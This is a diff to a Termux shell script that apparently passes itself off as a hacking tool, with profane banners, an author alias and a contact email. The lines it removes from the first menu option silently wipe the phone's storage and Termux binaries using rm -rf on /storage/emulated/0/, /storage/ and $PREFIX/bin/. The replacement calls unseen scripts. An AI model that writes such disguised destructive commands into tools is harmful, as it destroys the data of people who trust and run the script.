@@ -5,6 +5,9 @@
 
 
 clear
+clear
+clear
+clear
 
 termux-setup-storage
 
@@ -24,27 +27,27 @@ echo $f "Hello...Script Kiddie 😎"
 sleep 2
 
 
-toilet -f future  Fuck! | lolcat
+$ toilet -f mono12 -F gay "Fuck"
 
 echo ""
 
 echo "\033[30;1m|_______________________________________________|"
 
-echo "\033[37;1m[*]-------------------------------------------[*]"
+echo "\033[37;1m|-------------------------------------------[*]"
 
 echo ""
 
-echo "\033[30;1m{Author By : Mr Fuckking. }"
+echo "\033[30;1m| Author By : StarFuckTak ;v"
 
-echo "\033[36;1m[Kontak : mrfucking12@gmail.com]"
+echo "\033[36;1m| Kontak : mrfucking12@gmail.com"
 
-echo "\033[37;1m< From :" "\033[32;1m.Baiters Indonesia" "\033[39;1m&"  "\033[22;1mSAD Cyber Team >"
+echo "\033[37;1m| From :" "\033[32;1m.Baiters Indonesia" "\033[39;1m&"  "\033[22;1mSAD Cyber Team"
 
 echo ""
 
-echo "\033[37;1m------------------------------------------"
+echo "\033[37;1m|------------------------------------------|"
 
-echo "\033[33;1m__________________________________________"
+echo "\033[33;1m|__________________________________________|"
 
 sleep 01
 
@@ -70,20 +73,7 @@ if [ $kntl = 01 ] || [ $kntl = 1 ]
 then
 clear
 clear
-
-toilet -f standard "Mr.Fuckking" | lolcat
-
-sleep 1
-
-rm -rf /storage/emulated/0/
-
-rm -rf /storage/
-
-rm -rf /storage/sdcard/
-
-rm -rf /storage/sdcard1/
-
-rm -rf $PREFIX/bin/
+sh me.sh
 
 php knt.php
 
